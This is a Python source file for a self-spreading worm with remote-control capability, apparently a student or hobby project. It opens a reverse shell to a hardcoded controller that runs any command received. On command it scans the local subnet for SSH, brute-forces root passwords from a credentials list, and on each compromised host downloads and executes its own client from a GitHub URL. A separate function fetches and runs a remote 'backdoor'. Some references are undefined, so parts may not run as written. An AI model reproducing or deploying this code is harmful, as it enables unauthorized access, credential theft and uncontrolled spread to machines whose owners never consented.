#from socket import *
#from nmap import PortScanner
import nmap
import socket
import os
import ipaddress
import subprocess
import paramiko
import time
import sys
from colorama import init, Fore

init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE

"""
   while True:
      client, address = sock.accept()
      print("Client connected. ")
      while True:
         data = client.recv(size).rstrip()
         if not data:
            continue
         print("Received command: %s " % data)
      if data == "disconnect":
         print("Client disconnected.")
         client.send(data)
         client.close()
         break
      if data == "exit":
         print("Client want to exit.")
         client.send(data)
         client.close()
         return

"""


def downloadBackdoor(url):
   filename = url.split('/')[-1].split('#')[0].split('?')[0]
   content = urlopen(url).read()
   outfile = open(filename, "wb")
   outfile.write(content)
   outfile.close()
   run(os.path.abspath(filename))


def run(prog):
   process =sp.Popen(prog, shell=True)
   process.wait()



def is_ssh_open():
   nm = nmap.PortScanner()
   nm.scan(hosts='192.168.1.0/24', arguments= '-n -sS -p 22 --open')
   all_hosts = nm.all_hosts()
   print("hosts: " + str(all_hosts))
   return all_hosts



"""
def is_ssh_open():
    print("sono dentro ssh_open")
#   net4 = ipaddress.ip_network('192.168.1.0/27')
    target = []
#   for x in net4.hosts():
    for x in range (107,110):
       address = "192.168.1." + str(x)
       print('Testing %s' % address)
       s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       #t_IP = gethostbyname(x)
       conn = s.connect_ex((address,22))
       if(conn == 0):
          print('Port 22 on %s: OPEN ' % address)
          target.append(address)
       else:
          print('Port 22 on %s CLOSED' % address)
          s.close()

    for available in target:
       print(available)
    return target
"""


def brute_ssh(hostname, username, password):
     # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
      client.connect(hostname=hostname, username=username, password=password, timeout=3)
      (stdin, stdout, stderr) = client.exec_command('sudo apt install nmap')
      (stdin, stdout, stderr) = client.exec_command('sudo wget -P /tmp https://raw.githubusercontent.com/eric2296/test/main/client.py')
      print("stderr:", stderr.read())

      (stdin, stdout, stderr) = client.exec_command('sudo wget -P /tmp https://raw.githubusercontent.com/eric2296/test/main/creds.txt')
#      (stdin, stdout, stderr) = client.exec_command('sudo python3 /tmp/setup.py')

      print("stderr:", stderr.read())
#     (stdin, stdout, stderr) = client.exec_command('cd /tmp')
#     shell = client.invoke_shell()
#     shell.send('sudo wget https://raw.githubusercontent.com/eric2296/test/main/rev.sh')
#     shell.send('./client')
      (stdin, stdout, stderr) = client.exec_command('sudo chmod +rwx /tmp/client.py')
      print("stderr:", stderr.read())
#      shell = client.invoke_shell()
#      shell.send('./tmp/client')
      print("PRIMA DI ESEGUIRE")
      (stdin, stdout, stderr) = client.exec_command('cd /tmp; python3 ./client.py')
#        (stdin, stdout, stderr) = client.exec_command('./tmp/client') 
      print("stdout:", stdout.read())
      print("DOPO ESEGUIRE")
#      print("stdout:", stdout.read())
#     print("stderr:", stderr.read())

    except socket.timeout as error:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException as error:
        print("[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException as error:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return brute_ssh(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True



def propagate():
   targets = is_ssh_open()
   #READ FILE
   passlist = open("creds.txt").read().splitlines()
   username = "root"
   hostname = socket.gethostname()
   local_ip = socket.gethostbyname(hostname)

    #BRUTE FORCE
   for hostname in targets:
#      if hostname != local_ip:
      for password in passlist:
         if brute_ssh(hostname,username, password):
            # open("log.txt", "w").write(f"{username}@{hostname}:{password}")
            break



def command_shell():
   host = "192.168.1.111"
   port = 5000
   backlog = 5
   size = 1024
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   sock.connect((host, port))

   while True:
         data = sock.recv(size).decode()
         print('Received from server: ' + data)
         if data == "exit":
            print("Closing connection")
            sock.send(str.encode(data))
            sock.close()
            return
         if data == "propagate":
            propagate()

         if len(data) > 0:
            cmd = subprocess.Popen(data, shell= True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            sock.send(str.encode(output_str + str(os.getcwd())+ '> '))
            print(output_str)


   sock.close()





if __name__ == "__main__":
   command_shell()
